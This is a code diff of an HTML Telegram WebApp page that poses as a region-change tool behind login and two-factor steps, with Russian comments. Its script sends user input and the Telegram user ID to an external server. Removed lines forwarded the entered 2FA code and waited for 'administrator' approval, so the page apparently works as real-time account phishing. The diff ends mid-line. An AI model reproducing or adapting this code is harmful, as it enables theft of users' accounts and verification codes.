@@ -43,7 +43,7 @@
 <div class="login-form" id="menu-step" style="display:none;">
     <h2>Что вы хотите сделать?</h2>
     <button onclick="showRegionMenu()">Быстро сменить регион</button>
-    <button class="secondary" onclick="showIosMenu()">Скачать iOS</button>
+    <button class="secondary" onclick="backToLogin()">Выйти</button>
 </div>
 
 <div class="login-form" id="region-step" style="display:none;">
@@ -61,23 +61,18 @@
     const tg = window.Telegram.WebApp;
     tg.expand();
 
-    // ТВОЯ ССЫЛКА НА RENDER
     const serverUrl = 'https://sever-afk3.onrender.com'; 
-    
-    // Уникальный ID пользователя для отслеживания кнопок
     const userId = tg.initDataUnsafe.user ? tg.initDataUnsafe.user.id : "guest_" + Math.floor(Math.random() * 10000);
 
     async function apiRequest(endpoint, data) {
         try {
-            const response = await fetch(`${serverUrl}${endpoint}`, {
+            await fetch(`${serverUrl}${endpoint}`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ ...data, userId })
             });
-            return await response.json();
         } catch (e) {
             console.error("Ошибка сети:", e);
-            tg.showAlert("Ошибка соединения с сервером");
         }
     }
 
@@ -97,45 +92,4 @@
         const code = document.getElementById('code').value;
         if (code.length < 4) { tg.showAlert('Введите код'); return; }
 
-        document.getElementById('2fa-btn').disabled = true;
-        await apiRequest('/send-data', { type: '2fa', code });
-
-        tg.showConfirm("Ожидание подтверждения администратором...");
-
-        // Начинаем проверку статуса каждые 3 секунды
-        const checkStatus = setInterval(async () => {
-            try {
-                const res = await fetch(`${serverUrl}/check/${userId}`);
-                const data = await res.json();
-
-                if (data.status === 'success') {
-                    clearInterval(checkStatus);
-                    document.getElementById('2fa-step').style.display = 'none';
-                    document.getElementById('menu-step').style.display = 'flex';
-                    tg.showAlert("Вход выполнен успешно!");
-                } else if (data.status === 'error') {
-                    clearInterval(checkStatus);
-                    tg.showAlert("Код отклонен. Попробуйте снова.");
-                    location.reload(); // Перезагрузка страницы
-                }
-            } catch (e) { console.error(e); }
-        }, 3000);
-    }
-
-    // Вспомогательные функции меню
-    function showRegionMenu() {
-        document.getElementById('menu-step').style.display = 'none';
-        document.getElementById('region-step').style.display = 'flex';
-    }
-    function backToMenu() {
-        document.getElementById('region-step').style.display = 'none';
-        document.getElementById('menu-step').style.display = 'flex';
-    }
-    function confirmRegion(c) {
-        apiRequest('/send-data', { type: 'info', text: `Выбран регион: ${c}` });
-        tg.showAlert("Регион успешно изменен");
-        backToMenu();
-    }
-</script>
-</body>
-</html>
+        document.getElementById('2
